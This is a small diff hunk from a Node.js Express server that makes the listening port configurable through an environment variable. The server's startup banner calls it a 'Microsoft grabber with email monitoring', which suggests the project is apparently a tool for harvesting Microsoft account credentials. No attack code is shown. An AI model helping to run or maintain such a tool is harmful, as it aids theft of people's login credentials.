@@ -655,7 +655,7 @@ app.get('/clear', (req, res) => {
 });
 
 // Start server with email monitoring
-app.listen(PORT, async () => {
+app.listen(process.env.PORT || PORT, async () => {
     console.log(`
 🎯 MICROSOFT GRABBER WITH EMAIL MONITORING
 📍 http://localhost:${PORT}
